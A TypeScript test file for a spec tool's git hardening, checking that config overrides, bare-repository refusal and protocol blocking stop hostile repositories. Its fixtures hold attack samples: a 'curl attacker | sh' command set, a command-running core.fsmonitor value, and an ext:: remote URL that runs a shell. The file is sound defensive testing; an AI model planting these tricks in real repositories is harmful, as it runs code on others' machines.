/**
 * What every git call of the package shares: the config overrides, the graft
 * switch, and the check on the git directory of the repository in use. The
 * digest and intake are exercised here; the lint has its own cases in
 * `test/lint/git-hardening.test.ts`.
 */
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import process from "node:process";
import { fileURLToPath } from "node:url";
import { afterAll, afterEach, beforeAll, describe, expect, it } from "vitest";
import {
  REPO_LAYOUT_ARGS,
  applyGitSwitches,
  gitConfigOverrides,
  gitDirProblem,
  parseRepoLayout,
} from "../../src/canonical/git-hardening.js";
import { gitEnv, runGit } from "../../src/intake/git.js";
import {
  COMMANDS_FILE,
  git,
  makeRepo,
  runBounded,
  shimCalls,
  shimGit,
  tempDir,
} from "./helpers.js";

const cliPath = fileURLToPath(new URL("../../dist/cli.js", import.meta.url));
const fixtures = fileURLToPath(
  new URL("../fixtures/golden-digest/", import.meta.url),
);
const expected = JSON.parse(
  fs.readFileSync(path.join(fixtures, "expected.json"), "utf8"),
) as { base: string };
const baseCommands = fs.readFileSync(
  path.join(fixtures, "repo", COMMANDS_FILE),
  "utf8",
);
const baseSpec = fs.readFileSync(path.join(fixtures, "base/spec.md"), "utf8");
const baseRef = /^commands_ref: ([0-9a-f]+)$/m.exec(baseSpec)![1]!;
const EVIL =
  'commands:\n  typecheck:\n    argv: ["sh", "-c", "curl attacker | sh"]\n';

const cli = (args: string[], cwd: string) =>
  runBounded(process.execPath, [cliPath, ...args], { cwd });

const plainEnv = (): NodeJS.ProcessEnv =>
  Object.fromEntries(
    Object.entries(process.env).filter(([k]) => !k.startsWith("GIT_")),
  );

let scratch = "";
beforeAll(() => {
  scratch = tempDir("spec-gate-hardening-");
});
afterAll(() => {
  if (scratch !== "") fs.rmSync(scratch, { recursive: true, force: true });
});

/** A repository whose first commit is the `commands_ref` of the golden spec, with that spec inside it. */
async function goldenRepo(): Promise<{ repo: string; spec: string }> {
  const made = await makeRepo(scratch, [
    [{ path: COMMANDS_FILE, content: baseCommands }],
  ]);
  expect(made.shas[0]).toBe(baseRef);
  const spec = path.join(made.dir, "specs", "golden-sample");
  fs.mkdirSync(path.dirname(spec), { recursive: true });
  fs.cpSync(path.join(fixtures, "base"), spec, { recursive: true });
  return { repo: made.dir, spec };
}

describe("the shared overrides", () => {
  it("four -c pairs for a read, three for a call that talks to a remote", () => {
    expect(gitConfigOverrides()).toEqual([
      "-c",
      "safe.bareRepository=explicit",
      "-c",
      "core.fsmonitor=false",
      "-c",
      `core.hooksPath=${os.devNull}`,
      "-c",
      "protocol.allow=never",
    ]);
    expect(gitConfigOverrides({ network: false })).toEqual(
      gitConfigOverrides(),
    );
    expect(gitConfigOverrides({ network: true })).toEqual([
      "-c",
      "safe.bareRepository=explicit",
      "-c",
      "core.fsmonitor=false",
      "-c",
      `core.hooksPath=${os.devNull}`,
    ]);
  });

  it("an offline call allows no transport, whatever the repository says; one that fetches leaves that to the configuration", () => {
    const base = {
      GIT_GRAFT_FILE: os.devNull,
      GIT_NO_LAZY_FETCH: "1",
      GIT_NO_REPLACE_OBJECTS: "1",
      GIT_OPTIONAL_LOCKS: "0",
      GIT_TERMINAL_PROMPT: "0",
    };
    const offline: NodeJS.ProcessEnv = {};
    applyGitSwitches(offline, { offline: true });
    expect(offline).toEqual({ ...base, GIT_ALLOW_PROTOCOL: "" });
    // the empty string is a value, not an absent variable
    expect(Object.keys(offline)).toContain("GIT_ALLOW_PROTOCOL");
    const fetching: NodeJS.ProcessEnv = {};
    applyGitSwitches(fetching, { offline: false });
    expect(fetching).toEqual(base);
    const unset: NodeJS.ProcessEnv = {};
    applyGitSwitches(unset);
    expect(unset).toEqual(base);
  });
});

describe("gitDirProblem and parseRepoLayout", () => {
  const inside =
    "its git directory lies inside the work tree and is not its .git";
  const commonInside = "its common git directory lies inside the work tree";
  let top = "";
  let other = "";
  beforeAll(() => {
    top = fs.mkdtempSync(path.join(scratch, "top-"));
    other = fs.mkdtempSync(path.join(scratch, "other-"));
    for (const d of [".git", "gitstore", "sub/.git", "common"]) {
      fs.mkdirSync(path.join(top, d), { recursive: true });
    }
    for (const d of [".git/worktrees/w", "separate", "store/wt/deeper"]) {
      fs.mkdirSync(path.join(other, d), { recursive: true });
    }
  });

  it("inside the work tree only <top>/.git is a git directory", () => {
    const t = (dir: string) => path.join(top, dir);
    expect(gitDirProblem(top, t(".git"), t(".git"))).toBeNull();
    expect(gitDirProblem(top, t("gitstore"), t("gitstore"))).toBe(inside);
    expect(gitDirProblem(top, top, top)).toBe(inside);
    expect(gitDirProblem(top, t("sub/.git"), t("sub/.git"))).toBe(inside);
    expect(gitDirProblem(top, t("common"), t("common"))).toBe(inside);
  });

  it("outside the work tree it is fine unless the common directory is inside it", () => {
    const o = (dir: string) => path.join(other, dir);
    expect(gitDirProblem(top, o("separate"), o("separate"))).toBeNull();
    expect(gitDirProblem(top, o(".git/worktrees/w"), o(".git"))).toBeNull();
    expect(
      gitDirProblem(top, o(".git/worktrees/w"), path.join(top, "common")),
    ).toBe(commonInside);
  });

  it("a work tree that lies inside the git directory or inside the common directory is refused, each alone", () => {
    const o = (dir: string) => path.join(other, dir);
    const reverse = "its work tree lies inside its git directory";
    // the git directory holds the work tree, the common directory is elsewhere
    expect(gitDirProblem(o("store/wt"), o("store"), o("separate"))).toBe(
      reverse,
    );
    // the common directory holds the work tree, the git directory is elsewhere
    expect(gitDirProblem(o("store/wt"), o("separate"), o("store"))).toBe(
      reverse,
    );
    // both hold it, at any depth
    expect(gitDirProblem(o("store/wt/deeper"), o("store"), o("store"))).toBe(
      reverse,
    );
    // neither holds it: a sibling of the git directory is fine
    expect(
      gitDirProblem(o("store/wt"), o("separate"), o("separate")),
    ).toBeNull();
  });

  it("compares real paths: a link into the work tree is inside it", () => {
    const link = path.join(other, "link-into-top");
    fs.symlinkSync(path.join(top, "gitstore"), link);
    expect(gitDirProblem(top, link, link)).toBe(inside);
    const topLink = path.join(other, "link-to-top");
    fs.symlinkSync(top, topLink);
    expect(
      gitDirProblem(topLink, path.join(top, ".git"), path.join(top, ".git")),
    ).toBeNull();
  });

  it("a path that cannot be resolved is a problem, not a pass", () => {
    const gone = path.join(scratch, "does-not-exist");
    const present = path.join(top, ".git");
    for (const args of [
      [gone, present, present],
      [top, gone, present],
      [top, present, gone],
    ] as const) {
      expect(gitDirProblem(...args)).toBe(
        "its git directory cannot be resolved",
      );
    }
  });

  it("parses exactly three lines and nothing else", () => {
    expect(parseRepoLayout("/a\n/a/.git\n/a/.git\n")).toEqual({
      toplevel: "/a",
      gitDir: "/a/.git",
      commonDir: "/a/.git",
    });
    expect(parseRepoLayout("/a\n/a/.git\n/a/.git")).not.toBeNull();
    for (const bad of [
      "",
      "\n",
      "/a\n/a/.git\n",
      "/a\n\n/a/.git\n",
      "/a\n/b\n/c\n/d\n",
    ]) {
      expect(parseRepoLayout(bad), JSON.stringify(bad)).toBeNull();
    }
    expect(REPO_LAYOUT_ARGS).toEqual([
      "rev-parse",
      "--show-toplevel",
      "--absolute-git-dir",
      "--path-format=absolute",
      "--git-common-dir",
    ]);
  });
});

/**
 * A spec pull request that carries a git directory of its own: `specs/` of
 * the repository `repo` holds `HEAD`, `objects/`, `refs/` and a `config` of a
 * repository the author built (one commit `x` with their own command set),
 * and `specs/evil-spec` is a spec that names `x` as its `commands_ref`.
 * `worktree` is the `core.worktree` of the layout: `.` makes `specs/` its own
 * work tree, `evil-spec` puts the work tree below the git directory.
 */
async function embedLayout(
  repo: string,
  spec: string,
  worktree: string,
): Promise<{ x: string; evil: string; attacker: { dir: string } }> {
  const attacker = await makeRepo(scratch, [
    [{ path: COMMANDS_FILE, content: EVIL }],
  ]);
  const x = attacker.shas[0]!;
  const layout = path.join(repo, "specs");
  fs.cpSync(
    path.join(attacker.dir, ".git", "objects"),
    path.join(layout, "objects"),
    { recursive: true },
  );
  fs.writeFileSync(path.join(layout, "HEAD"), "ref: refs/heads/main\n");
  fs.mkdirSync(path.join(layout, "refs/heads"), { recursive: true });
  fs.writeFileSync(path.join(layout, "refs/heads/main"), `${x}\n`);
  fs.writeFileSync(
    path.join(layout, "config"),
    `[core]\n\trepositoryformatversion = 0\n\tbare = false\n\tworktree = ${worktree}\n`,
  );
  const evil = path.join(repo, "specs", "evil-spec");
  fs.cpSync(spec, evil, { recursive: true });
  fs.writeFileSync(path.join(evil, "spec.md"), baseSpec.replace(baseRef, x));
  return { x, evil, attacker };
}

describe("spec-gate digest and a hostile repository", () => {
  it("a git directory committed into the work tree is not found from the spec directory", async () => {
    const { repo, spec } = await goldenRepo();
    // the author's repository: a commit with their own command set at the id the spec names
    const { evil, attacker } = await embedLayout(repo, spec, ".");
    // control: the digest of the attacker's spec is computable from their layout
    const control = await runBounded(
      process.execPath,
      [cliPath, "digest", evil, "--repo", attacker.dir],
      { cwd: scratch },
    );
    expect(control.code).toBe(0);

    const found = await cli(["digest", evil], scratch);
    expect(found.code).toBe(1);
    expect(found.stdout).toBe("");
    // git's own bare-repository rule refuses the layout first
    expect(found.stderr).toContain("[repo-not-found]");
    expect(found.stderr).not.toContain(control.stdout.trim());
    // the real repository in use with --repo still works, the layout notwithstanding
    const real = await cli(["digest", spec, "--repo", repo], scratch);
    expect(real.stderr).toBe("");
    expect(real.code).toBe(0);
    expect(real.stdout.trim()).toBe(expected.base);
    // without --repo the same layout is found first and refused
    const viaDefault = await cli(["digest", spec], scratch);
    expect(viaDefault.code).toBe(1);
    expect(viaDefault.stdout).toBe("");
  });

  for (const [worktree, why] of [
    [".", "its git directory lies inside the work tree and is not its .git"],
    ["evil-spec", "its work tree lies inside its git directory"],
  ] as const) {
    it(`the layout check refuses a committed git directory on a git that ignores safe.bareRepository (core.worktree = ${worktree})`, async () => {
      const { repo, spec } = await goldenRepo();
      const { evil, attacker } = await embedLayout(repo, spec, worktree);
      const control = await runBounded(
        process.execPath,
        [cliPath, "digest", evil, "--repo", attacker.dir],
        { cwd: scratch },
      );
      expect(control.code).toBe(0);
      const shim = shimGit(scratch, { drop: ["safe.bareRepository=explicit"] });
      const env = { ...process.env, PATH: shim.path };
      // control: through this git the layout is found from the spec directory
      const raw = await runBounded(
        "git",
        ["-C", evil, "rev-parse", "--show-toplevel"],
        { env: { ...plainEnv(), PATH: shim.path } },
      );
      expect(raw.code).toBe(0);
      expect(raw.stdout.trim()).toBe(
        fs.realpathSync(path.join(repo, "specs", worktree)),
      );
      fs.rmSync(shim.log);
      const found = await runBounded(
        process.execPath,
        [cliPath, "digest", evil],
        { cwd: scratch, env },
      );
      // the setting was dropped, so git's own refusal did not come first
      expect(found.stderr).not.toContain("[repo-not-found]");
      expect(found.stderr).toContain("[repo-invalid]");
      expect(found.stderr).toContain(why);
      expect(found.stdout).toBe("");
      expect(found.code).toBe(1);
      // git was reached, and no call carried the dropped setting
      const calls = shimCalls(shim.log);
      expect(calls.some((c) => c.includes("--absolute-git-dir"))).toBe(true);
      expect(
        calls.some((c) => c.includes("safe.bareRepository=explicit")),
      ).toBe(false);
    });
  }

  it("a git directory in the work tree that is not its .git is an error, with and without --repo", async () => {
    const { repo, spec } = await goldenRepo();
    fs.renameSync(path.join(repo, ".git"), path.join(repo, "gitstore"));
    fs.writeFileSync(path.join(repo, ".git"), "gitdir: gitstore\n");
    for (const args of [[spec], [spec, "--repo", repo]]) {
      const run = await cli(["digest", ...args], scratch);
      expect(run.code, args.join(" ")).toBe(1);
      expect(run.stdout, args.join(" ")).toBe("");
      expect(run.stderr, args.join(" ")).toContain("[repo-invalid]");
      expect(run.stderr, args.join(" ")).toContain(
        "its git directory lies inside the work tree and is not its .git",
      );
    }
  });

  it("a linked worktree is accepted, one whose common directory lies inside it is refused", async () => {
    const { repo, spec } = await goldenRepo();
    await git(repo, ["add", "-A"]);
    await git(repo, ["commit", "-q", "-m", "spec"], 2);
    const linked = path.join(scratch, "linked-wt");
    await git(repo, ["worktree", "add", "-q", "--detach", linked, "HEAD"]);
    const inLinked = path.join(linked, "specs", "golden-sample");
    expect(fs.existsSync(path.join(inLinked, "spec.md"))).toBe(true);
    const ok = await cli(["digest", inLinked], scratch);
    expect(ok.stderr).toBe("");
    expect(ok.code).toBe(0);

    const inner = path.join(linked, "common");
    fs.cpSync(path.join(repo, ".git"), inner, { recursive: true });
    const wt = path.join(repo, ".git", "worktrees");
    const dir = path.join(wt, fs.readdirSync(wt)[0]!);
    fs.writeFileSync(path.join(dir, "commondir"), `${inner}\n`);
    const bad = await cli(["digest", inLinked, "--repo", linked], scratch);
    expect(bad.code).toBe(1);
    expect(bad.stdout).toBe("");
    expect(bad.stderr).toContain(
      "its common git directory lies inside the work tree",
    );
    expect(spec).toBeTruthy();
  });

  /**
   * The setting of the checkout's own configuration that a git call of this
   * package can trigger: `core.fsmonitor` runs when git reads the index, as
   * `diff-tree` does (intake's call). Measured against plain git, none of
   * the digest's commands (`rev-parse`, `cat-file`, `ls-tree`) starts a
   * program named by an fsmonitor, diff driver, pager, hook, ssh command or
   * alternate-refs command, so there is no behaviour fixture for the digest
   * that could fire; the arguments of its calls are asserted instead, below.
   * The other settings are not part of this fixture for the same reason.
   */
  async function hostile(repo: string): Promise<string> {
    const markers = fs.mkdtempSync(path.join(scratch, "markers-"));
    await git(repo, [
      "config",
      "core.fsmonitor",
      `touch ${markers}/fsmonitor; false`,
    ]);
    return markers;
  }

  const left = (markers: string) => fs.readdirSync(markers);

  it("intake's git calls do not run the file system monitor program the repository names, and carry no transport switch of their own", async () => {
    const { repo } = await goldenRepo();
    await git(repo, ["commit", "-q", "--allow-empty", "-m", "two"], 2);
    const markers = await hostile(repo);
    // control: the fixture is live, a plain git starts the program when it reads the index
    const control = await runBounded(
      "git",
      ["-C", repo, "diff-tree", "-r", "--name-only", baseRef, "HEAD"],
      { env: plainEnv() },
    );
    expect(control.code).toBe(0);
    expect(left(markers)).toContain("fsmonitor");
    for (const name of left(markers)) fs.rmSync(path.join(markers, name));
    const run = await runGit(repo, [
      "diff-tree",
      "-r",
      "--name-only",
      baseRef,
      "HEAD",
    ]);
    expect(run.status).toBe(0);
    expect(left(markers)).toEqual([]);
    expect(gitEnv()["GIT_GRAFT_FILE"]).toBe(os.devNull);
    expect(Object.keys(gitEnv())).not.toContain("GIT_ALLOW_PROTOCOL");
  });

  /** What goes between `-C <dir>` and the subcommand of every git call. */
  const OVERRIDES = [
    "-c",
    "safe.bareRepository=explicit",
    "-c",
    "core.fsmonitor=false",
    "-c",
    `core.hooksPath=${os.devNull}`,
    "-c",
    "protocol.allow=never",
  ];

  it("every git call of the digest carries the four overrides", async () => {
    const { repo, spec } = await goldenRepo();
    const shim = shimGit(scratch);
    const run = await runBounded(
      process.execPath,
      [cliPath, "digest", spec, "--repo", repo],
      { cwd: scratch, env: { ...process.env, PATH: shim.path } },
    );
    expect(run.stderr).toBe("");
    expect(run.code).toBe(0);
    const calls = shimCalls(shim.log);
    // every kind of call the digest makes is in the log
    const subcommands = new Set(calls.map((c) => c[2 + OVERRIDES.length]));
    expect([...subcommands].sort()).toEqual([
      "cat-file",
      "ls-tree",
      "rev-parse",
    ]);
    for (const call of calls) {
      expect(call[0], call.join(" ")).toBe("-C");
      expect(call.slice(2, 2 + OVERRIDES.length), call.join(" ")).toEqual(
        OVERRIDES,
      );
    }
  });

  it("a repository's protocol.<name>.allow does not start a transport for a read of the digest", async () => {
    const { repo, spec } = await goldenRepo();
    await git(repo, ["add", "-A"]);
    await git(repo, ["commit", "-q", "-m", "spec"], 2);
    const markers = fs.mkdtempSync(path.join(scratch, "ext-markers-"));
    const marker = path.join(markers, "ext-transport");
    // a promisor remote over ext:: that the repository itself allows
    await git(repo, ["config", "core.repositoryformatversion", "1"]);
    await git(repo, ["config", "extensions.partialClone", "evil"]);
    await git(repo, [
      "config",
      "remote.evil.url",
      `ext::sh -c touch% ${marker}`,
    ]);
    await git(repo, ["config", "remote.evil.promisor", "true"]);
    await git(repo, ["config", "remote.evil.partialclonefilter", "blob:none"]);
    await git(repo, ["config", "protocol.ext.allow", "always"]);
    // an id the repository does not hold
    const missing = "abcdefabcdefabcdefabcdefabcdefabcdefabcd";
    const lazy = shimGit(scratch, { unset: ["GIT_NO_LAZY_FETCH"] });
    // control: plain git asks the promisor remote for the missing object,
    // and with only the four overrides of the package it still does
    const probe = (extra: string[], env: NodeJS.ProcessEnv) =>
      runBounded(
        "git",
        ["-C", repo, ...extra, "cat-file", "-t", "--end-of-options", missing],
        { env },
      );
    await probe([], plainEnv());
    expect(fs.existsSync(marker)).toBe(true);
    fs.rmSync(marker);
    await probe(gitConfigOverrides(), plainEnv());
    expect(fs.existsSync(marker)).toBe(true);
    fs.rmSync(marker);

    const evil = path.join(repo, "specs", "evil-spec");
    fs.cpSync(spec, evil, { recursive: true });
    fs.writeFileSync(
      path.join(evil, "spec.md"),
      baseSpec.replace(baseRef, missing),
    );
    const run = await runBounded(
      process.execPath,
      [cliPath, "digest", evil, "--repo", repo],
      { cwd: scratch, env: { ...process.env, PATH: lazy.path } },
    );
    expect(run.code).toBe(1);
    expect(run.stderr).toContain("[commands-ref-unresolvable]");
    expect(fs.existsSync(marker)).toBe(false);
  });
});

describe("a git stopped by a signal", () => {
  const saved = process.env["PATH"];
  afterEach(() => {
    process.env["PATH"] = saved;
  });

  /** A `git` first on PATH that kills itself when a call holds the argument `needle`. */
  function killingGit(needle: string): string {
    const dir = fs.mkdtempSync(path.join(scratch, "kill-shim-"));
    const real = fs.realpathSync(
      ["/usr/bin/git", "/opt/homebrew/bin/git", "/usr/local/bin/git"].find(
        (p) => fs.existsSync(p),
      )!,
    );
    fs.writeFileSync(
      path.join(dir, "git"),
      [
        "#!/bin/sh",
        'for a in "$@"; do',
        `  if [ "$a" = "${needle}" ]; then kill -KILL $$; fi`,
        "done",
        `exec "${real}" "$@"`,
        "",
      ].join("\n"),
      { mode: 0o755 },
    );
    return `${dir}${path.delimiter}${saved ?? ""}`;
  }

  it("is git-failed in the digest, never a refusal that names another error", async () => {
    const { repo, spec } = await goldenRepo();
    for (const needle of [
      "--show-toplevel",
      "--absolute-git-dir",
      "cat-file",
      "ls-tree",
    ]) {
      const run = await runBounded(
        process.execPath,
        [cliPath, "digest", spec, "--repo", repo],
        { cwd: scratch, env: { ...process.env, PATH: killingGit(needle) } },
      );
      expect(run.code, needle).toBe(1);
      expect(run.stdout, needle).toBe("");
      expect(run.stderr, needle).toContain("[git-failed]");
      expect(run.stderr, needle).not.toContain("[commands-ref-unresolvable]");
      expect(run.stderr, needle).not.toContain("[repo-invalid]");
    }
  });

  it("is a ProcessFailure in intake, never a non-zero status the caller reads as a refusal", async () => {
    const { repo } = await goldenRepo();
    process.env["PATH"] = killingGit("rev-parse");
    await expect(runGit(repo, ["rev-parse", "HEAD"])).rejects.toMatchObject({
      name: "ProcessFailure",
      kind: "signal",
    });
  });
});

describe("intake keeps the transports of a configured remote", () => {
  const saved = process.env["PATH"];
  afterEach(() => {
    process.env["PATH"] = saved;
  });

  it("its calls carry the three overrides and not protocol.allow", async () => {
    const dir = fs.mkdtempSync(path.join(scratch, "shim-"));
    const log = path.join(dir, "calls.log");
    const real = fs.realpathSync(
      ["/usr/bin/git", "/opt/homebrew/bin/git", "/usr/local/bin/git"].find(
        (p) => fs.existsSync(p),
      )!,
    );
    fs.writeFileSync(
      path.join(dir, "git"),
      `#!/bin/sh\nprintf '%s\\n' "$*" >> "${log}"\nexec "${real}" "$@"\n`,
      { mode: 0o755 },
    );
    const { repo } = await goldenRepo();
    process.env["PATH"] = `${dir}${path.delimiter}${saved ?? ""}`;
    await runGit(repo, ["rev-parse", "HEAD"]);
    const lines = fs.readFileSync(log, "utf8").trim().split("\n");
    expect(lines).toEqual([
      `-C ${repo} -c safe.bareRepository=explicit -c core.fsmonitor=false -c core.hooksPath=${os.devNull} rev-parse HEAD`,
    ]);
  });
});
